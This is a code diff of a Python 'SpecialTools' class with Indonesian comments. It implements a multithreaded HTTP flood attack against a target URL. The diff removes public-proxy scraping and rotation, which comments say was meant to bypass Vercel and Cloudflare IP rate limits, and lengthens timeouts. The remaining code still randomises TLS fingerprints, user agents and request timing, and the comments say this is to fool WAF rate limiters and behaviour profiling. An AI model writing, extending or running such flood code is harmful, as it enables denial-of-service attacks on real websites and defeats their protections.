@@ -75,19 +75,6 @@ class SpecialTools:
             
         self.isFlooding = True
         self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
-        
-        # Scrape proxy gratis untuk menembus IP-Rate Limit
-        proxies_list = []
-        try:
-            print("[*] Menginisiasi pengumpulan Proxy untuk Bypass Limit IP Vercel/CF...")
-            proxy_fetch = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)
-            if proxy_fetch.status_code == 200:
-                raw_px = proxy_fetch.text.split('\n')
-                proxies_list = [p.strip() for p in raw_px if p.strip()]
-                print(f"[+] Berhasil mengumpulkan {len(proxies_list)} HTTP proxy aktif!")
-        except Exception:
-            print("[-] Gagal mengambil daftar proxy. Melanjutkan serangan mode Jalur Tunggal (Single-IP).")
-        
         print(f"[*] Evaluasi HTTP Flood ke {targetUrl} menggunakan {threads} pekerja.")
 
         def attack_worker():
@@ -119,13 +106,6 @@ class SpecialTools:
                     # Variasi jeda yang nyata untuk membodohi rate limiter dinamis (WAF behavior profiling)
                     time.sleep(random.uniform(0.05, 0.2))
                     
-                    # Inisiasi Pilihan Proxy
-                    current_proxy = None
-                    proxy_dict = None
-                    if proxies_list:
-                        current_proxy = random.choice(proxies_list)
-                        proxy_dict = {"http": f"http://{current_proxy}", "https": f"http://{current_proxy}"}
-                        
                     if has_tls_client:
                         # Buat session TLS baru tiap request dengan fingerprint yang berbeda-beda
                         client_profile = random.choice(tls_profiles)
@@ -134,9 +114,6 @@ class SpecialTools:
                             random_tls_extension_order=True
                         )
                         
-                        if current_proxy:
-                            tls_session.proxies = proxy_dict
-                            
                         user_agent = random.choice(self.user_agents)
                         is_chrome = "Chrome" in user_agent
                         
@@ -157,7 +134,7 @@ class SpecialTools:
                         # Menghapus elemen kosong (contoh Referer kosong)
                         headers = {k: v for k, v in headers.items() if v}
                         
-                        resp = tls_session.get(targetUrl, headers=headers, timeout_seconds=6, allow_redirects=True)
+                        resp = tls_session.get(targetUrl, headers=headers, timeout_seconds=8, allow_redirects=True)
                         
                     else:
                         # Fallback ke request biasa jika tls_client tidak terinstall
@@ -180,7 +157,7 @@ class SpecialTools:
                         }
                         headers = {k: v for k, v in headers.items() if v}
                         
-                        resp = session.get(targetUrl, headers=headers, proxies=proxy_dict, timeout=6, allow_redirects=True)
+                        resp = session.get(targetUrl, headers=headers, timeout=8, allow_redirects=True)
                     
                     
                     code = resp.status_code
@@ -191,8 +168,6 @@ class SpecialTools:
                     
                 except Exception:
                     self.stats["error"] += 1
-                    if 'current_proxy' in locals() and current_proxy in proxies_list:
-                        proxies_list.remove(current_proxy)
 
         workers = []
         for _ in range(threads):
